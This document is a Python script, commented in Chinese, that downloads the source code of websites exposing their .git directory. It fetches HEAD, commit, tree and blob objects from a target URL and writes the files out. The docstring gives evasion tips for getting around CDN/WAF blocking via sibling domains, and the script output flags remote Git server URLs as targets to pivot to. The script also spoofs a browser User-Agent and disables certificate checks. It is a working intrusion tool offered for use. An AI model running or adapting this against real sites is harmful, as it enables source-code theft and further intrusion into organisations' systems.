#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""手工 dump 暴露在 HTTP 上的 .git 仓库（GitHacker / git-dumper 失败时用）。

用法:
    python3 git_dump_manual.py https://target/.git/ ./out
    python3 git_dump_manual.py https://target/.git/ ./out --prefix App/
    python3 git_dump_manual.py https://target/.git/ ./out --list-only

原理:
    .git/HEAD -> refs/heads/<branch> -> commit SHA
    objects/<sha[:2]>/<sha[2:]> 是 zlib 压缩的 git 对象,
    解压后 = b"<type> <size>\\x00<content>"。
    commit 对象里有 "tree <sha>";tree 对象是 <mode> <name>\\x00<20字节sha> 的序列,递归即可。
    只依赖标准库。

为什么不用 `.git/index`:
    index 可能只是旧快照 / 缺被 gitignore 的文件（实测 3984 条目里目标目录只列到 56 个）。
    commit->tree->blob 遍历才是权威。若确实要解析 index(v2),对齐公式是
        total = 62 + namelen; pad = 8 - (total % 8); pad==0 时补 8
    写错会大面积错位（实测 284/3984 假阳性）。

注意:
    - 目标若在 CDN/WAF 后面,请求 `.git/*` 会即时封出口 IP。先用不在同一 CDN 的兄弟域名。
    - 被 .gitignore 的配置文件不在仓库里,别指望从这里拿数据库密码。
"""
import os
import re
import ssl
import sys
import time
import urllib.request
import zlib

CTX = ssl._create_unverified_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"


def setup(argv):
    if len(argv) < 3:
        print(__doc__)
        sys.exit(2)
    base = argv[1]
    if not base.endswith("/"):
        base += "/"
    out = argv[2]
    prefix = None
    if "--prefix" in argv:
        prefix = argv[argv.index("--prefix") + 1]
    return base, out, prefix, ("--list-only" in argv)


BASE, OUT, PREFIX, LIST_ONLY = setup(sys.argv)


def fetch(path, tries=3, delay=0.4):
    """GET a path under .git/. Returns bytes or None. 404s are expected for missing objects."""
    url = BASE + path
    for _ in range(tries):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": UA})
            return urllib.request.urlopen(req, timeout=25, context=CTX).read()
        except Exception:
            time.sleep(delay)
    return None


def read_object(sha):
    """Return (type_bytes, body_bytes) or (None, None)."""
    raw = fetch("objects/%s/%s" % (sha[:2], sha[2:]))
    if not raw:
        return None, None
    try:
        data = zlib.decompress(raw)
    except Exception:
        return None, None
    nul = data.find(b"\x00")
    if nul < 0:
        return None, None
    return data[:nul].split(b" ")[0], data[nul + 1:]


def walk_tree(sha, path=""):
    """Yield (full_path, blob_sha) for every blob under a tree object."""
    otype, body = read_object(sha)
    if otype != b"tree":
        return
    pos = 0
    while pos < len(body):
        sp = body.find(b" ", pos)
        nul = body.find(b"\x00", sp)
        if sp < 0 or nul < 0:
            return
        mode = body[pos:sp].decode("ascii", "ignore")
        name = body[sp + 1:nul].decode("utf-8", "ignore")
        sub = body[nul + 1:nul + 21].hex()
        full = (path + "/" + name).lstrip("/")
        if mode == "40000":
            for item in walk_tree(sub, full):
                yield item
        else:
            yield full, sub
        pos = nul + 21


def resolve_commit():
    head = fetch("HEAD")
    if not head:
        print("[-] .git/HEAD 不可读 —— 该站没有暴露 .git（或已被 WAF 拦）")
        sys.exit(1)
    head = head.strip().decode("utf-8", "ignore")
    print("[+] HEAD = %s" % head)
    if head.startswith("ref:"):
        ref = head.split(":", 1)[1].strip()
        sha = fetch(ref)
        if not sha:
            print("[-] 读不到 %s（可能是 packed refs）" % ref)
            sys.exit(1)
        return sha.strip().decode()
    return head  # detached HEAD


def main():
    cfg = fetch("config")
    if cfg:
        for line in cfg.decode("utf-8", "ignore").splitlines():
            if "url" in line and "=" in line:
                print("[+] remote: %s   <<< 组织自建 Git 服务线索,值得立刻转场" % line.strip())

    commit = resolve_commit()
    print("[+] commit = %s" % commit)
    otype, body = read_object(commit)
    if otype != b"commit":
        print("[-] 取不到 commit 对象（对象被 pack 了或不完整）")
        sys.exit(1)
    tree = re.search(rb"tree ([0-9a-f]{40})", body).group(1).decode()
    print("[+] root tree = %s" % tree)

    files = list(walk_tree(tree))
    print("[+] 共 %d 个文件" % len(files))
    if PREFIX:
        files = [f for f in files if f[0].startswith(PREFIX)]
        print("[+] 前缀 %s 匹配 %d 个" % (PREFIX, len(files)))

    manifest = []
    got = 0
    for path, sha in files:
        manifest.append("%s  %s" % (sha, path))
        if LIST_ONLY:
            continue
        otype, data = read_object(sha)
        if data is None:
            continue
        dest = os.path.join(OUT, path.replace("/", os.sep))
        os.makedirs(os.path.dirname(dest) or OUT, exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(data)
        got += 1

    os.makedirs(OUT, exist_ok=True)
    with open(os.path.join(OUT, "_MANIFEST.txt"), "w", encoding="utf-8") as fh:
        fh.write("\n".join(manifest))
    print("[+] 落盘 %d / %d 个文件 -> %s" % (got, len(files), OUT))
    print("[+] 清单 -> %s/_MANIFEST.txt" % OUT)


if __name__ == "__main__":
    main()
